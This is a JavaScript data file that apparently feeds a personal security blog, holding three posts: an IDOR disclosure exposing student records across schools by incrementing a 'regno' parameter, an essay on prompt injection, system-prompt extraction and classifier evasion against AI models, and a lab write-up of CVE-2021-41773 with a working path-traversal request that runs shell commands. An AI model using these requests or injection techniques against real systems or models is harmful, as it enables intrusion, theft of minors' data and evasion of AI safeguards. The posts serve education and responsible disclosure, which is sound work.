// =================================================================
// NAYA POST ADD KARNE KE LIYE, IS ARRAY MEIN EK NAYA OBJECT ADD KAREIN
// =================================================================
// 'title', 'date', 'excerpt', aur 'content' zaroori hain.
// 'content' mein aap HTML tags (jaise <p>, <h3>, <code>) use kar sakte hain.

const postsData = [
    {
    title: "I Changed One Number… and Ended Up Accessing Multiple School Databases",
    date: "April 07, 2026",
    excerpt: "A simple parameter change led to IDOR, multi-school data exposure, and even access to previous academic records.",
    content: `
        <p>This wasn’t supposed to be a big find.</p>

        <p>I was just going through a school registration system. Normal stuff. Forms, payment pages, student details — nothing unusual.</p>

        <p>Then I saw this:</p>

        <pre><code>/print_payment.php?regno=1765</code></pre>

        <p>A direct parameter. No login. No token. Just <code>regno</code>.</p>

        <p>So yeah… I did what anyone curious would do.</p>

        <p>I changed it.</p>

        <pre><code>1765 → 1766</code></pre>

        <p>And the page refreshed with a completely different student.</p>

        <p>I just sat there for a second.</p>

        <p>No error. No restriction. Nothing.</p>

        <p>That’s when it clicked — this is IDOR.</p>

        <h2>🧠 It Got Worse Pretty Fast</h2>

        <p>The IDs were sequential.</p>

        <p>Which basically means… you don’t need to “hack” anything.</p>

        <p>You just count.</p>

        <p>1765, 1766, 1767… and so on.</p>

        <p>Every request returned a new student’s data.</p>

        <p>Names. Parent details. Registration info.</p>

        <p>No authentication. No checks.</p>

        <p>If someone wanted, they could dump the entire database in minutes.</p>

        <p>At this point, it was already serious. But I kept going.</p>

        <h2>🌐 Then I Realized Something Bigger</h2>

        <p>While testing more endpoints, I noticed something odd.</p>

        <p>The system wasn’t just for one school.</p>

        <p>It was shared.</p>

        <p>Multiple branches… maybe even multiple institutions.</p>

        <p>Same structure. Same behavior.</p>

        <p>Same vulnerability.</p>

        <p>That’s when it hit me — this isn’t a single-app issue.</p>

        <p>This is one backend exposing data across multiple schools.</p>

        <h2>⏳ And Then… Old Data Showed Up</h2>

        <p>I tried changing something else — the directory.</p>

        <pre><code>/REG_2627/ → current  
/REG_2526/ → previous</code></pre>

        <p>And it worked.</p>

        <p>I was now looking at data from a previous academic year.</p>

        <p>Older records. Still accessible. Same issue.</p>

        <p>That honestly made it worse.</p>

        <p>It wasn’t just current students — it was historical data too.</p>

        <h2>🧪 Something Felt Off</h2>

        <p>While playing around with inputs, I noticed a few weird responses.</p>

        <p>Nothing fully exploitable right away, but… not clean either.</p>

        <p>It looked like the backend wasn’t handling input properly.</p>

        <p>Possible injection behavior.</p>

        <p>I didn’t push it further — the IDOR itself was already enough.</p>

        <h2>🔐 The Weird Part</h2>

        <p>There actually <em>was</em> a validation system.</p>

        <pre><code>/SchoolPanel/validate.php</code></pre>

        <p>This one required a verification code (<code>vcode</code>) and blocked access properly.</p>

        <p>So clearly, they knew about security.</p>

        <p>They just… didn’t apply it everywhere.</p>

        <p>Some parts locked down.</p>

        <p>Other parts completely open.</p>

        <p>That inconsistency is what caused all of this.</p>

        <h2>💥 What’s Actually Wrong Here</h2>

        <ul>
            <li>No authorization checks on critical endpoints</li>
            <li>Sequential and predictable IDs</li>
            <li>Security applied only in certain places</li>
        </ul>

        <p>No complex exploit. No fancy bypass.</p>

        <p>Just missing checks.</p>

        <h2>🚨 Real Risk</h2>

        <p>If someone abused this properly:</p>

        <ul>
            <li>Full data scraping</li>
            <li>Identity theft</li>
            <li>Targeted phishing</li>
            <li>Exposure of minors’ data</li>
        </ul>

        <p>And the scary part — it would be quiet.</p>

        <p>No alerts. No logs (most likely).</p>

        <h2>🧠 What I Took From This</h2>

        <pre><code>Security doesn’t fail loudly.  
It fails silently… in the parts nobody checks.</code></pre>

        <p>This wasn’t about breaking something.</p>

        <p>It was about noticing what wasn’t protected.</p>

        <h2>🛡️ Responsible Disclosure</h2>

        <p>I reported everything responsibly. Didn’t store any data. Didn’t go beyond what was needed to confirm the issue.</p>

        <h2>🚀 Final Thought</h2>

        <p>All of this… from changing one number.</p>

        <p class="signature">~ OffsecKalki</p>
    `
},
    {
        title: "Hacking AI: The Wild West of the Machine Mind",
        date: "August 16, 2025",
        excerpt: "AI hacking goes far beyond making a chatbot say bad things — it's the new frontier of cybersecurity, echoing the chaotic early days of the web.",
        content: `
            <p>On a quiet afternoon, Jason Haddix sat at his laptop and typed a single, almost whimsical command into GPT-4: <em>make me a magic card.</em> The model complied. But tucked inside the response was something unexpected: GPT-4’s hidden system prompt—the confidential instructions that shape its personality. With just a playful nudge, Haddix had tricked one of the world’s most advanced AI systems into revealing its inner voice.</p>

            <p>That moment wasn’t just a parlor trick. It was a glimpse into a new frontier of hacking—where attackers don’t need zero-days or custom malware. They just need to talk.</p>

            <h2>🚨 Beyond Jailbreaks</h2>
            <p>“Hacking AI” is often caricatured as making a chatbot curse or spout conspiracy theories. But the real danger runs deeper. In a world where AI quietly underpins customer service bots, backend APIs, and even corporate knowledge bases, an AI breach can mean stolen trade secrets, compromised databases, or a manipulated workforce.</p>
            <p>Security researchers liken this to the <strong>early days of web hacking</strong>, when companies were racing to get online, blind to SQL injection and cross-site scripting. Today, they’re racing to embed AI everywhere, often without security sign-off.</p>
            <p>The result? A gold rush of vulnerabilities.</p>

            <h2>🎯 The Primary Weapon: Prompt Injection</h2>
            <p>If SQL injection was the cyber plague of Web 1.0, <strong>prompt injection</strong> may be the plague of AI 1.0. It’s deceptively simple: tricking an AI into following hidden instructions by embedding them in plain text.</p>
            <ul>
                <li>Want a chatbot to reveal sensitive data? Wrap your request in a clever metaphor.</li>
                <li>Want it to write malicious code into Salesforce? Bury instructions in emojis or Unicode.</li>
                <li>Want it to leak credit card numbers? Disguise the data as an image URL pointing to your own server.</li>
            </ul>
            <p></p>
            <p>As one hacker put it: <em>“You don’t need to be a coder to break AI. You just need to be creative.”</em></p>

            <h2>🧩 Taxonomies of Trickery</h2>
            <p>Researchers have catalogued a dizzying array of techniques:</p>
            <ul>
                <li><strong>Emoji smuggling</strong>: Hide payloads in Unicode metadata.</li>
                <li><strong>Narrative injection</strong>: Disguise attacks as roleplay or storytelling.</li>
                <li><strong>Syntactic anti-classifiers</strong>: Rephrase forbidden requests in metaphors (e.g., Donald Duck smoking → “a sailor-suited aquatic bird with a smoldering paper roll”).</li>
                <li><strong>Link smuggling</strong>: Coax the AI into exfiltrating data via links.</li>
            </ul>
            <p>This taxonomy suggests a staggering <strong>9.9 trillion possible attack combinations</strong>. That’s not a typo. It’s an arms race where defense is always a step behind.</p>

            <h2>🌐 The Ecosystem Problem</h2>
            <p>The danger isn’t just the models—it’s everything around them. Companies have already wired AI into Salesforce, legal databases, and HR systems. Too often, the integrations come with <strong>over-scoped APIs</strong>—keys that can both read and write when only one is needed.</p>
            <p>That means a single malicious prompt could insert JavaScript into CRM notes or alter financial records. With protocols like <strong>Model Context Protocol (MCP)</strong>, the risk multiplies: insecure servers can pull files without permissions or be backdoored by invisible code.</p>
            <p>In effect, a compromised AI isn’t just a bad chatbot—it’s a skeleton key to the enterprise.</p>

            <h2>⚔️ Hackers and Heroes</h2>
            <p>Unsurprisingly, communities have sprung up to exploit—and to defend. On Discord servers and GitHub repos, underground groups trade jailbreaks like contraband. At <strong>DefCon</strong>, hackers stand on stage, live-demoing AI exploits in front of cheering crowds.</p>
            <p>Meanwhile, defenders scramble. Startups now pitch “AI firewalls,” classifiers that sit in front of models like digital bouncers. Cloud security firms such as Wiz have launched <em>AI Security Posture Management</em> to hunt down shadow AIs hiding in organizations.</p>
            <p>Sam Altman, who once shrugged off prompt injection as solvable, now admits it may haunt us “for a long, long time.”</p>

            <h2>🤖 Offense and Defense</h2>
            <p>AI itself is joining both sides of the fight. Autonomous agents are already <strong>ranking on bug bounty leaderboards</strong>, automating reconnaissance and sniffing out common vulnerabilities. But when it comes to subtle, high-value bugs, humans still outperform.</p>
            <p>On defense, AI promises relief from cybersecurity’s most tedious jobs: patch management, ticketing, prioritization. Tools like <strong>N8N</strong> aim to automate the entire vulnerability lifecycle. But irony cuts deep—many of the frameworks driving AI automation (LangChain, CrewAI, LangGraph) are themselves vulnerable to attack.</p>

            <h2>🚧 The Future: A High-Stakes Gamble</h2>
            <p>Companies know they have to deploy AI or risk falling behind. But they’re also building on shaky ground. As systems become <em>agentic</em>—where multiple AIs collaborate to act autonomously—defenses become exponentially harder. Latency spikes. Complexity soars. Attack surfaces multiply.</p>
            <p>For now, AI security feels less like a polished science and more like a live-fire experiment. Hackers turn emojis into weapons. Researchers swap jailbreaks like Pokémon cards. CEOs gamble that the benefits of AI outweigh the looming risks.</p>

            <h2>💡 Closing Thought</h2>
            <p>The question isn’t whether AI can be hacked. It already is. The real question is whether organizations will learn from history—or whether the next great data breach will come not from a phishing email, but from a friendly chatbot whispering secrets it was never meant to share.</p>

            <p class="signature">~ OffsecKalki</p>
            <div class="video-container">
  <h2>Watch the Full Podcast</h2>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/Qvx2sVgQ-u0?si=2puO41CUvi0vzTv8&amp;start=60" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
</div>

        `
    },
    {
        title: "CVE-2021-41773: Apache HTTPD Path Traversal Exploit",
        date: "August 06, 2025",
        excerpt: "This triggered shell execution and confirmed the server was vulnerable. One line. One hit. Shell pop.",
        content: `
            <p><strong>Discovered in October 2021</strong>, <code>CVE-2021-41773</code> is a directory traversal vulnerability in Apache HTTP Server version 2.4.49. It allows attackers to map URLs to files outside the intended document root using crafted path traversal sequences like <code>../</code>.</p>
            <p>This vulnerability becomes critical when combined with misconfigured <code>mod_cgi</code>, allowing attackers to execute arbitrary commands on the server — turning a simple LFI into full-blown RCE.</p>
            <h2>🔍 My Approach</h2>
            <p>I replicated the vulnerability in a lab with Apache 2.4.49 running on Ubuntu. No WAF. CGI enabled. A perfect storm.</p>
            <p>Request used:</p>
            <pre><code>GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: vulnerable.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

echo; id
</code></pre>
            <p>This triggered shell execution and confirmed the server was vulnerable. One line. One hit. Shell pop.</p>
            <h2>📌 Key Lessons</h2>
            <ul>
                <li>Never expose <code>mod_cgi</code> publicly unless it's sandboxed or containerized.</li>
                <li>Always validate patch versions — admins often update partially.</li>
                <li>Don't underestimate LFI — they often become RCE in creative hands.</li>
            </ul>
            <h2>💬 Final Thoughts</h2>
            <p>This CVE is a classic reminder: <strong>simple misconfigurations lead to critical impact</strong>. My goal with testing such exploits isn't just execution — it’s education. Security isn’t about paranoia — it’s about precision.</p>
            <p class="signature">~ OffsecKalki</p>
        `
    }
    // NAYA POST YAHAN ADD KAREIN. Example:
    /*
    {
        title: "New Post Title",
        date: "August 10, 2025",
        excerpt: "This is the summary of my new amazing blog post.",
        content: "<p>Full content of the new post goes here.</p>"
    },
    */
];
